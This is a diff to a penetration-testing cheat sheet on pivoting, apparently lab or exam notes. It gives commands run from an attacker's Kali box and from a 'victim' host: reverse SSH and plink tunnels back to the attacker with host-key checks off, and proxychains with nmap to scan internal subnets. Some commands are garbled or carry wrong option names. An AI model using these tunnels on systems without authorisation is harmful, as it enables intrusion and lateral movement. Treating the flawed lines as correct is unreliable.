@@ -14,7 +14,7 @@ Key Concepts to avoid confusion:
 * -R = Your host port \(R = Remote\)
 * &lt;IP&gt;:3306 = The IP and PORT from the target
 
-### Local Port Forwarding
+### SSH Local Port Forwarding
 
 Things to consider:
 
@@ -24,53 +24,76 @@ Things to consider:
 Try local port forwarding:
 
 ```text
-ssh –L 3306:<IP>:3306 user@$target_ip
+username@kali: ssh –L 3306:<IP>:3306 user@$target_ip
 ```
 
-### Remote Port Forwarding
+On Kali verify that the port is listening:
+
+```text
+ss -antp | grep "3306"
+```
+
+Scan the port:
+
+```text
+sudo nmap -sS -sV 127.0.0.1 -p 3306
+```
+
+### SSH Remote Port Forwarding
 
 Things to consider:
 
-* No SSH Access but limited shell? 
-* Also, some weird port is open on local-host? 
+* No SSH access but limited shell? 
+* Also, some port is listening only on local-host? 
 
 Try remote port forwarding:
 
 ```text
-ssh –R 3306:localhost:3306 root@kali_ip
-ssh –R 3306:localhost:3306 -o "UserKnownHostFile=/dev/null" -o "UserHostKeyChecking=no" root@kali_ip
+username@victim: ssh -N -R <kali-IP>:<kali-port>:127.0.0.1:3306 kali@<kali-IP>
+username@victim: ssh –R 3306:localhost:3306 root@kali_ip
+username@victim: ssh –R 3306:localhost:3306 -o "UserKnownHostFile=/dev/null" -o "UserHostKeyChecking=no" root@kali_ip
 ```
 
 Connect to the tunneled port:
 
 ```text
 #Verify with nc
-nc -vvv localhost 3306
+username@kali: nc -vvv localhost 3306
 
 #If mysql
-mysql -u username -p -h 127.0.0.1 -P 3306
+username@kali: mysql -u username -p -h 127.0.0.1 -P 3306
 ```
 
-### Dynamic Port Forwarding \(Socks4\)
+### SSH Dynamic Port Forwarding
 
-Dynamic Port Forwarding from victim machine\(Socks Proxy\):
+If the target has more than one NIC and more than one network subnet than we can user proxychains.
+
+In Kali edit the **proxychains** configuration file:
 
 ```text
-ssh -D 8080 -f -N user@$target_ip
+sudo vim /etc/proxychains.conf
 ```
 
-With Dynamic Port Forwarding we can access/browse any IP range of the victim machine. We just need to configure proxychains.conf as follows:
+Add this lines:
 
 ```text
-nano /etc/proxychains.conf
-...
-.
-.
-....
-socks4  127.0.0.1 8080
+[ProxyList]
+socks4 127.0.0.1 8080
 ```
 
-Now we can use any application through proxychains… such as:
+Perform a dynamic port forwarding to our port 8080
+
+```text
+sudo ssh -N -D 127.0.0.1:8080 username@<target-IP>
+```
+
+Then scan with nmap and specify a **TCP** scan with `-sT` and don't use `ICMP` with `-Pn`. This flags are mandatory, read [this](https://security.stackexchange.com/questions/120708/nmap-through-proxy).
+
+```text
+proxychains nmap -p- -sT -Pn <target-Second-Interface-IP>
+```
+
+Now we can use any application through **proxychains**… such as:
 
 ```text
 proxychains firefox
@@ -116,10 +139,22 @@ pip install sshuttlesshuttle -r user@host 10.10.10.10/24
 
 ## Plink
 
-Remote port forwarding using Plink. This is needed when we don’t have access to a specific port on the target machine. From the target machine we can execute this command:
+Remote port forwarding using plink. This is needed when we don’t have access to a specific port on the target machine. From the target machine we can execute this command:
 
 ```text
 plink.exe -ssh -l kali_user -pw kali_password -R $kali_ip:445:127.0.0.1:445 $kali_ip
+```
+
+An alternative way to execute plink without prompt:
+
+```text
+cmd.exe /c echo y | plink.exe -ssh -l kali_usernmae -pw kali_password -R <kali-IP>:<kali-port>:127.0.0.1:3306 <kali-IP>
+```
+
+After forwarding the port to our host, we can try scanning it or connecting to it:
+
+```text
+sudo nmap -sS -sV 127.0.0.1 -p <kali-port>
 ```
 
 ## Chisel <a id="chisel"></a>
